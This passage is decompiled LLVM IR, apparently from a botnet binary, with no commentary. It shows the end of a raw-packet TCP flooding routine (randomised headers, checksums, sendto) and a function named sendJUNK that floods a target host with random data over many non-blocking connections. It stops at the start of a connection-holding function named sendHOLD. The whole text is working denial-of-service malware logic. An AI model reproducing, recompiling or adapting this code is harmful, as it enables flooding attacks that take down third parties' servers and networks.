  %v1_10c64 = call i32 @HackerScan2(i32 %storemerge10)
  store i32 %v1_10c64, i32* %r3.global-to-local, align 4
  store i32 %v1_10c64, i32* @r0, align 4
  %v1_10c70 = call i32 @__GI_htonl(i32 %v1_10c64)
  store i32 %v1_10c70, i32* %r2.global-to-local, align 4
  store i32 %v3_107e8, i32* %r3.global-to-local, align 4
  store i32 %v1_10c70, i32* %v3_10c7c, align 4
  %v0_10c80 = call i32 @rand_cmwc()
  %v3_10c8c = urem i32 %v0_10c80, 65536
  store i32 %v3_10c8c, i32* %r3.global-to-local, align 4
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v1_10c94 = trunc i32 %v0_10c80 to i8
  store i8 %v1_10c94, i8* %v4_10c94, align 4
  %v0_10c98 = load i32, i32* %r3.global-to-local, align 4
  %v3_10c98 = sdiv i32 %v0_10c98, 256
  store i32 %v3_10c98, i32* %r3.global-to-local, align 4
  %v1_10c9c = trunc i32 %v3_10c98 to i8
  %v2_10c9c = load i32, i32* %r2.global-to-local, align 4
  %v3_10c9c = add i32 %v2_10c9c, 5
  %v4_10c9c = inttoptr i32 %v3_10c9c to i8*
  store i8 %v1_10c9c, i8* %v4_10c9c, align 1
  %v0_10ca0 = call i32 @rand_cmwc()
  store i32 %v0_10ca0, i32* %r2.global-to-local, align 4
  store i32 %v1_10808, i32* %r3.global-to-local, align 4
  store i32 %v0_10ca0, i32* %v3_10874, align 4
  %v0_10cb0 = call i32 @rand_cmwc()
  %v3_10cbc = urem i32 %v0_10cb0, 65536
  store i32 %v3_10cbc, i32* %r3.global-to-local, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_10cc4 = trunc i32 %v0_10cb0 to i8
  store i8 %v1_10cc4, i8* %v5_1080c, align 4
  %v0_10cc8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10cc829 = udiv i32 %v0_10cc8, 256
  %v1_10ccc = trunc i32 %v3_10cc829 to i8
  %v2_10ccc = load i32, i32* %r2.global-to-local, align 4
  %v3_10ccc = add i32 %v2_10ccc, 1
  %v4_10ccc = inttoptr i32 %v3_10ccc to i8*
  store i8 %v1_10ccc, i8* %v4_10ccc, align 1
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_10b4c, align 4
  store i8 0, i8* %v5_10cdc, align 1
  %v5_10ce8 = call i32 @tcpcsum(i32 %v3_107e8, i32 %v1_10808, i32 %v1_10808, i32 0)
  %sext5 = mul i32 %v5_10ce8, 16777216
  %v1_10cec = sdiv i32 %sext5, 16777216
  store i32 %v1_10cec, i32* %r3.global-to-local, align 4
  store i32 %v1_10808, i32* %r2.global-to-local, align 4
  %v1_10cf4 = trunc i32 %v1_10cec to i8
  store i8 %v1_10cf4, i8* %v4_10b4c, align 4
  %v0_10cf8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10cf830 = udiv i32 %v0_10cf8, 256
  %v1_10cfc = trunc i32 %v3_10cf830 to i8
  %v2_10cfc = load i32, i32* %r2.global-to-local, align 4
  %v3_10cfc = add i32 %v2_10cfc, 17
  %v4_10cfc = inttoptr i32 %v3_10cfc to i8*
  store i8 %v1_10cfc, i8* %v4_10cfc, align 1
  store i32 %v1_10be8, i32* %r3.global-to-local, align 4
  %v2_10d10 = load i8, i8* %v1_10bec, align 2
  %v3_10d10 = zext i8 %v2_10d10 to i32
  store i32 %v3_10d10, i32* %r2.global-to-local, align 4
  %v3_10d14 = load i8, i8* %v2_10bf0, align 1
  %v4_10d14 = zext i8 %v3_10d14 to i32
  %v4_10d18 = mul nuw nsw i32 %v4_10d14, 256
  %v5_10d18 = or i32 %v4_10d18, %v3_10d10
  store i32 %v5_10d18, i32* %r3.global-to-local, align 4
  %v3_10d24 = call i32 @csum(i8* %v4_10844, i32 %v5_10d18)
  %sext6 = mul i32 %v3_10d24, 16777216
  %v1_10d28 = sdiv i32 %sext6, 16777216
  store i32 %v1_10d28, i32* %r3.global-to-local, align 4
  store i32 %v3_107e8, i32* %r2.global-to-local, align 4
  %v1_10d30 = trunc i32 %v1_10d28 to i8
  store i8 %v1_10d30, i8* %v4_10c0c, align 2
  %v0_10d34 = load i32, i32* %r3.global-to-local, align 4
  %v3_10d3431 = udiv i32 %v0_10d34, 256
  %v1_10d38 = trunc i32 %v3_10d3431 to i8
  %v2_10d38 = load i32, i32* %r2.global-to-local, align 4
  %v3_10d38 = add i32 %v2_10d38, 11
  %v4_10d38 = inttoptr i32 %v3_10d38 to i8*
  store i8 %v1_10d38, i8* %v4_10d38, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_10d44 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_10d44, label %dec_label_pc_10d4c, label %dec_label_pc_10d70

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10c38
  %v2_10d50 = call i32 @time(i32* null)
  store i32 %v2_10d50, i32* %r2.global-to-local, align 4
  store i32 %v2_10c28, i32* %r3.global-to-local, align 4
  %v8_10d60 = icmp sgt i32 %v2_10d50, %v2_10c28
  br i1 %v8_10d60, label %dec_label_pc_10d80, label %dec_label_pc_10d64

dec_label_pc_10d64:                               ; preds = %dec_label_pc_10d4c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c38

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10c38
  %v1_10d74 = add i32 %stack_var_-88.0, 1
  store i32 %v1_10d74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c38

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d4c, %dec_label_pc_106c0, %dec_label_pc_1076c, %dec_label_pc_10720
  %v12_10d88 = phi i32 [ %v3_106d0, %dec_label_pc_106c0 ], [ %v3_1077c, %dec_label_pc_1076c ], [ %v3_10730, %dec_label_pc_10720 ], [ %v2_10d50, %dec_label_pc_10d4c ]
  store i32 %v3_10634, i32* @r4, align 4
  store i32 %v6_10634, i32* @fp, align 4
  ret i32 %v12_10d88

; uselistorder directives
  uselistorder i32 %v1_10d74, { 1, 0 }
  uselistorder i32 %v1_10d28, { 1, 0 }
  uselistorder i32 %v1_10cec, { 1, 0 }
  uselistorder i32 %v0_10cb0, { 1, 0 }
  uselistorder i32 %v3_10c98, { 1, 0 }
  uselistorder i32 %v0_10c80, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_10c28, { 1, 0, 2 }
  uselistorder i32 %v3_10c10, { 1, 0 }
  uselistorder i32 %v1_10c04, { 1, 0 }
  uselistorder i32 %v1_10be8, { 0, 2, 1 }
  uselistorder i32 %v1_10bc8, { 1, 0 }
  uselistorder i32 %v3_10bb4, { 2, 0, 1 }
  uselistorder i8 %v0_10b70.sink.off0, { 1, 0 }
  uselistorder i32 %v3_10b90, { 1, 0 }
  uselistorder i32 %v0_10b70, { 1, 0 }
  uselistorder i32 %v0_10b24, { 1, 0 }
  uselistorder i32 %v2_10b0c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_109b8, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_108c8, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v3_10860, { 1, 0 }
  uselistorder i32 %v0_10848, { 1, 0 }
  uselistorder i32 %v1_10808, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_107e8, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_107b8, { 1, 0 }
  uselistorder i32 %v3_106a4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 11, 12, 9, 10, 16, 17, 13, 14, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 27, 28, 32, 33, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 59, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 53, 55, 54, 56, 58, 57, 83, 60, 61, 62, 63, 64, 65, 68, 66, 67, 69, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 2, 1, 3, 4, 5, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @__libc_sendto, { 3, 0, 1, 2 }
  uselistorder i32 (i8*, i32)* @csum, { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32)* @makeIPPacket, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @HackerScan2, { 1, 0, 3, 2, 4 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @__GI_setsockopt, { 2, 0, 1 }
  uselistorder i32 ()* @rand_cmwc, { 7, 6, 5, 4, 3, 2, 1, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_10d80, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10b04, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10998, { 1, 0 }
  uselistorder label %dec_label_pc_107b4, { 1, 0 }
  uselistorder label %dec_label_pc_106c0, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10dbc = load i32, i32* @r4, align 4
  store i32 %v3_10dbc, i32* %stack_var_-20, align 4
  %v6_10dbc = load i32, i32* @fp, align 4
  store i32 69060, i32* %stack_var_-4, align 4
  %v2_10dc0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10dc0, i32* @fp, align 4
  %v0_10ddc = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_10ddc, 0
  %v3_10de4 = zext i1 %tmp to i32
  %v2_10de8 = add i32 %v3_10de4, %v0_10ddc
  %v3_10dec = sdiv i32 %v2_10de8, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v3_10e0c = urem i32 %arg2, 65536
  %v1_10e14 = call i32 @__GI_htons(i32 %v3_10e0c)
  %v3_10e38 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_10e40 = icmp eq i32 %v3_10e38, 0
  br i1 %v2_10e40, label %dec_label_pc_10e4c, label %dec_label_pc_112bc

dec_label_pc_10e4c:                               ; preds = %entry
  %v16_10dbc = ptrtoint i32* %stack_var_-20 to i32
  store i32 8, i32* @r2, align 4
  %v2_10e60 = bitcast i32* %stack_var_-60 to i8*
  %v3_10e60 = call i32 @__GI_memset(i8* %v2_10e60, i32 0)
  %v3_10e68 = mul i32 %v3_10dec, 8
  %v1_10e6c = or i32 %v3_10e68, 3
  %v1_10e70 = add i32 %v1_10e6c, 3
  %v3_10e74 = and i32 %v1_10e70, -4
  %v1_10e7c = load i32, i32* @sp, align 4
  %v2_10e7c = sub i32 %v1_10e7c, %v3_10e74
  %v1_10e8c = add i32 %v2_10e7c, 7
  %v3_10e90 = and i32 %v1_10e8c, -4
  %v2_10eb4 = mul i32 %v3_10dec, 5
  store i32 %v2_10eb4, i32* @r2, align 4
  %v2_10ec4 = inttoptr i32 %v3_10e90 to i8*
  %v3_10ec4 = call i32 @__GI_memset(i8* %v2_10ec4, i32 0)
  %v1_10ecc = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_10ee4 = inttoptr i32 %v1_10ecc to i8*
  %v3_10ee4 = call i32 @__GI_memset(i8* %v2_10ee4, i32 0)
  %v2_10eec = call i32 @time(i32* null)
  store i32 %v2_10eec, i32* %r2.global-to-local, align 4
  %v2_10ef8 = add i32 %v2_10eec, %arg3
  %v2_11034 = ptrtoint i32* %stack_var_-196 to i32
  %v2_110f8 = ptrtoint i32* %stack_var_-204 to i32
  %v2_11140 = ptrtoint i32* %stack_var_-208 to i32
  %v4_11230 = inttoptr i32 %v1_10ecc to i32*
  %v3_10fd4 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v8_1129c47 = icmp sgt i32 %v2_10de8, 1
  %v2_10f20 = add i32 %v3_10e90, 4
  %v2_11090 = add i32 %v16_10dbc, -176
  br label %dec_label_pc_112a4

dec_label_pc_10f10:                               ; preds = %dec_label_pc_11294.preheader, %dec_label_pc_11288
  %storemerge250 = phi i32 [ %v1_1128c, %dec_label_pc_11288 ], [ 0, %dec_label_pc_11294.preheader ]
  store i32 %v3_10e90, i32* %r2.global-to-local, align 4
  %v3_10f1c = mul i32 %storemerge250, 8
  %v2_10f24 = add i32 %v2_10f20, %v3_10f1c
  %v1_10f28 = inttoptr i32 %v2_10f24 to i8*
  %v2_10f28 = load i8, i8* %v1_10f28, align 4
  %v6_10f34 = icmp eq i8 %v2_10f28, 0
  %v7_10f34 = icmp eq i8 %v2_10f28, 1
  br i1 %v7_10f34, label %dec_label_pc_11048.lr.ph, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f10
  %v7_10f40 = icmp eq i8 %v2_10f28, 2
  br i1 %v7_10f40, label %dec_label_pc_11208, label %dec_label_pc_10f48

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10f3c
  br i1 %v6_10f34, label %dec_label_pc_10f58, label %dec_label_pc_11288

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f48
  store i32 %storemerge250, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_10f68 = call i32 @socket()
  %v2_10f74 = load i32, i32* @r4, align 4
  %v5_10f74 = mul i32 %v2_10f74, 8
  %v6_10f74 = add i32 %v5_10f74, %v3_10e90
  %v7_10f74 = inttoptr i32 %v6_10f74 to i32*
  store i32 %v0_10f68, i32* %v7_10f74, align 4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v5_10f80 = add i32 %v3_10f1c, %v3_10e90
  %v6_10f80 = inttoptr i32 %v5_10f80 to i32*
  %v7_10f80 = load i32, i32* %v6_10f80, align 4
  store i32 %v7_10f80, i32* @r4, align 4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_10f8c = load i32, i32* %v6_10f80, align 4
  store i32 %v7_10f8c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10f9c = call i32 @__libc_fcntl(i32 %v7_10f8c, i32 3)
  %v1_10fa4 = or i32 %v2_10f9c, 2048
  store i32 %v1_10fa4, i32* @r3, align 4
  %v0_10fa8 = load i32, i32* @r4, align 4
  store i32 %v1_10fa4, i32* %r2.global-to-local, align 4
  %v2_10fb4 = call i32 @__libc_fcntl(i32 %v0_10fa8, i32 4)
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_10fc0 = load i32, i32* %v6_10f80, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_10fd4 = call i32 @__libc_connect(i32 %v7_10fc0, %sockaddr* %v3_10fd4, i32 16)
  %v3_10fdc = icmp eq i32 %v4_10fd4, -1
  br i1 %v3_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_10ff8

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10f58
  %v0_10fe4 = call i32 @__GI___errno_location()
  %v1_10fec = inttoptr i32 %v0_10fe4 to i32*
  %v2_10fec = load i32, i32* %v1_10fec, align 4
  %v7_10ff0 = icmp eq i32 %v2_10fec, 115
  br i1 %v7_10ff0, label %dec_label_pc_11010, label %dec_label_pc_10ff8

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10f58, %dec_label_pc_10fe4
  store i32 %v3_10e90, i32* %r2.global-to-local, align 4
  %v7_11000 = load i32, i32* %v6_10f80, align 4
  %v1_11008 = call i32 @__GI_close(i32 %v7_11000)
  br label %dec_label_pc_11288

dec_label_pc_11010:                               ; preds = %dec_label_pc_10fe4
  store i32 %v2_10f24, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_10f28, align 4
  br label %dec_label_pc_11288

dec_label_pc_11048.lr.ph:                         ; preds = %dec_label_pc_10f10
  br label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_11048.lr.ph, %dec_label_pc_11048
  %storemerge37 = phi i32 [ 0, %dec_label_pc_11048.lr.ph ], [ %v1_1105c, %dec_label_pc_11048 ]
  store i32 %v2_11034, i32* %r2.global-to-local, align 4
  %v5_11054 = mul nuw nsw i32 %storemerge37, 4
  %v6_11054 = add i32 %v5_11054, %v2_11034
  %v7_11054 = inttoptr i32 %v6_11054 to i32*
  store i32 0, i32* %v7_11054, align 4
  %v1_1105c = add nuw nsw i32 %storemerge37, 1
  %tmp41 = icmp ult i32 %v1_1105c, 32
  br i1 %tmp41, label %dec_label_pc_11048, label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11048
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v5_11078 = add i32 %v3_10f1c, %v3_10e90
  %v6_11078 = inttoptr i32 %v5_11078 to i32*
  %v7_11078 = load i32, i32* %v6_11078, align 4
  %v3_1107c = udiv i32 %v7_11078, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_11088 = mul nuw nsw i32 %v3_1107c, 4
  %v2_11094 = add i32 %v2_11090, %v3_11088
  %v1_11098 = inttoptr i32 %v2_11094 to i32*
  %v2_11098 = load i32, i32* %v1_11098, align 4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_110a4 = load i32, i32* %v6_11078, align 4
  %v1_110a8 = urem i32 %v7_110a4, 32
  %v6_110b0 = shl i32 1, %v1_110a8
  %v2_110b4 = or i32 %v6_110b0, %v2_11098
  store i32 %v2_110b4, i32* %v1_11098, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_110ec = load i32, i32* %v6_11078, align 4
  %v1_110f0 = add i32 %v7_110ec, 1
  store i32 %v1_110f0, i32* %r2.global-to-local, align 4
  %v1_110fc = load i32, i32* @sp, align 4
  %v2_110fc = inttoptr i32 %v1_110fc to i32*
  store i32 %v2_110f8, i32* %v2_110fc, align 4
  %v0_11100 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_11034, i32* %r2.global-to-local, align 4
  %v4_11110 = load i32, i32* %stack_var_-204, align 4
  %v5_11110 = call i32 @__libc_select(i32 %v0_11100, i32 0, i32 %v2_11034, i32 0, i32 %v4_11110)
  %v7_11120 = icmp eq i32 %v5_11110, 1
  br i1 %v7_11120, label %dec_label_pc_11128, label %dec_label_pc_111c4

dec_label_pc_11128:                               ; preds = %dec_label_pc_11070
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_11138 = load i32, i32* %v6_11078, align 4
  store i32 %v7_11138, i32* %r2.global-to-local, align 4
  %v1_11144 = load i32, i32* @sp, align 4
  %v2_11144 = inttoptr i32 %v1_11144 to i32*
  store i32 %v2_11140, i32* %v2_11144, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11158 = call i32 @getsockopt()
  %v3_1115c = load i32, i32* %stack_var_-212, align 4
  %v2_11160 = icmp eq i32 %v3_1115c, 0
  br i1 %v2_11160, label %dec_label_pc_111a0, label %dec_label_pc_11168

dec_label_pc_11168:                               ; preds = %dec_label_pc_11128
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_11170 = load i32, i32* %v6_11078, align 4
  %v1_11178 = call i32 @__GI_close(i32 %v7_11170)
  store i32 %v2_10f24, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f28, align 4
  br label %dec_label_pc_11288

dec_label_pc_111a0:                               ; preds = %dec_label_pc_11128
  store i32 %v2_10f24, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_10f28, align 4
  br label %dec_label_pc_11288

dec_label_pc_111c4:                               ; preds = %dec_label_pc_11070
  %v3_111c8 = icmp eq i32 %v5_11110, -1
  br i1 %v3_111c8, label %dec_label_pc_111d0, label %dec_label_pc_11288

dec_label_pc_111d0:                               ; preds = %dec_label_pc_111c4
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_111d8 = load i32, i32* %v6_11078, align 4
  %v1_111e0 = call i32 @__GI_close(i32 %v7_111d8)
  store i32 %v2_10f24, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f28, align 4
  br label %dec_label_pc_11288

dec_label_pc_11208:                               ; preds = %dec_label_pc_10f3c
  %v2_11210 = call i32 @makeRandomStr(i32 %v1_10ecc, i32 1024)
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v5_1121c = add i32 %v3_10f1c, %v3_10e90
  %v6_1121c = inttoptr i32 %v5_1121c to i32*
  %v7_1121c = load i32, i32* %v6_1121c, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v5_11230 = call i32 @__libc_send(i32 %v7_1121c, i32* %v4_11230, i32 1024, i32 16384)
  %v3_11238 = icmp eq i32 %v5_11230, -1
  br i1 %v3_11238, label %dec_label_pc_11240, label %dec_label_pc_11288

dec_label_pc_11240:                               ; preds = %dec_label_pc_11208
  %v0_11240 = call i32 @__GI___errno_location()
  %v1_11248 = inttoptr i32 %v0_11240 to i32*
  %v2_11248 = load i32, i32* %v1_11248, align 4
  %v7_1124c = icmp eq i32 %v2_11248, 11
  br i1 %v7_1124c, label %dec_label_pc_11288, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_11240
  store i32 %storemerge250, i32* %r2.global-to-local, align 4
  %v7_1125c = load i32, i32* %v6_1121c, align 4
  %v1_11264 = call i32 @__GI_close(i32 %v7_1125c)
  store i32 %v2_10f24, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f28, align 4
  br label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %dec_label_pc_10f48, %dec_label_pc_111c4, %dec_label_pc_11208, %dec_label_pc_11240, %dec_label_pc_111d0, %dec_label_pc_111a0, %dec_label_pc_11168, %dec_label_pc_11010, %dec_label_pc_10ff8, %dec_label_pc_11254
  %v1_1128c = add nuw nsw i32 %storemerge250, 1
  store i32 %v1_1128c, i32* %r2.global-to-local, align 4
  %v5_112a0 = icmp slt i32 %v1_1128c, %v3_10dec
  br i1 %v5_112a0, label %dec_label_pc_10f10, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_11294.preheader, %dec_label_pc_11288, %dec_label_pc_10e4c
  %v2_112a8 = call i32 @time(i32* null)
  store i32 %v2_112a8, i32* %r2.global-to-local, align 4
  %v5_112b8 = icmp slt i32 %v2_112a8, %v2_10ef8
  br i1 %v5_112b8, label %dec_label_pc_11294.preheader, label %dec_label_pc_112bc

dec_label_pc_11294.preheader:                     ; preds = %dec_label_pc_112a4
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1129c47, label %dec_label_pc_10f10, label %dec_label_pc_112a4

dec_label_pc_112bc:                               ; preds = %dec_label_pc_112a4, %entry
  %v12_112c4 = phi i32 [ %v3_10e38, %entry ], [ %v2_112a8, %dec_label_pc_112a4 ]
  %v2_112c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_112c4, i32* @r4, align 4
  store i32 %v6_10dbc, i32* @fp, align 4
  ret i32 %v12_112c4

; uselistorder directives
  uselistorder i32 %v1_1128c, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_10f28, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_10f24, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_10f1c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge250, { 0, 8, 7, 6, 5, 4, 3, 2, 1, 12, 11, 10, 9, 13 }
  uselistorder i32 %v2_11034, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10ecc, { 1, 0, 2 }
  uselistorder i32 %v3_10e90, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_10dec, { 1, 2, 0 }
  uselistorder i32 %v0_10ddc, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 35, 32, 31, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 34, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_11288, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11048, { 1, 0 }
  uselistorder label %dec_label_pc_10ff8, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_112cc = load i32, i32* @r4, align 4
  store i32 %v3_112cc, i32* %stack_var_-20, align 4
  %v6_112cc = load i32, i32* @fp, align 4
  store i32 70356, i32* %stack_var_-4, align 4
  %v2_112d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_112d0, i32* @fp, align 4
  %v0_112ec = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_112ec, 0
  %v3_112f4 = zext i1 %tmp to i32
  %v2_112f8 = add i32 %v3_112f4, %v0_112ec
  %v3_112fc = sdiv i32 %v2_112f8, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_1131c = urem i32 %arg2, 65536
  %v1_11324 = call i32 @__GI_htons(i32 %v3_1131c)
  %v3_11348 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_11350 = icmp eq i32 %v3_11348, 0
  br i1 %v2_11350, label %dec_label_pc_1135c, label %dec_label_pc_11874

dec_label_pc_1135c:                               ; preds = %entry
  %v16_112cc = ptrtoint i32* %stack_var_-20 to i32
  store i32 8, i32* @r2, align 4
  %v2_11370 = bitcast i32* %stack_var_-68 to i8*
  %v3_11370 = call i32 @__GI_memset(i8* %v2_11370, i32 0)
  %v3_11378 = mul i32 %v3_112fc, 8
  %v1_1137c = or i32 %v3_11378, 3
  %v1_11380 = add i32 %v1_1137c, 3
  %v3_11384 = and i32 %v1_11380, -4
  %v1_1138c = load i32, i32* @sp, align 4
  %v2_1138c = sub i32 %v1_1138c, %v3_11384
  %v1_1139c = add i32 %v2_1138c, 7
  %v3_113a0 = and i32 %v1_1139c, -4
  %v2_113c4 = mul i32 %v3_112fc, 5
  store i32 %v2_113c4, i32* @r2, align 4
  %v2_113d4 = inttoptr i32 %v3_113a0 to i8*
  %v3_113d4 = call i32 @__GI_memset(i8* %v2_113d4, i32 0)
  %v1_113dc = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_113f4 = inttoptr i32 %v1_113dc to i8*
  %v3_113f4 = call i32 @__GI_memset(i8* %v2_113f4, i32 0)
  %v2_113fc = call i32 @time(i32* null)
  store i32 %v2_113fc, i32* %r2.global-to-local, align 4
  %v2_11408 = add i32 %v2_113fc, %arg3
  %v2_11544 = ptrtoint i32* %stack_var_-204 to i32
  %v2_11608 = ptrtoint i32* %stack_var_-212 to i32
  %v2_11650 = ptrtoint i32* %stack_var_-216 to i32
  %v3_114e4 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v8_1185456 = icmp sgt i32 %v2_112f8, 1
  %v2_11430 = add i32 %v3_113a0, 4
  %v2_115a0 = add i32 %v16_112cc, -184
  br label %dec_label_pc_1185c

dec_label_pc_11420:                               ; preds = %dec_label_pc_1184c.preheader, %dec_label_pc_11840
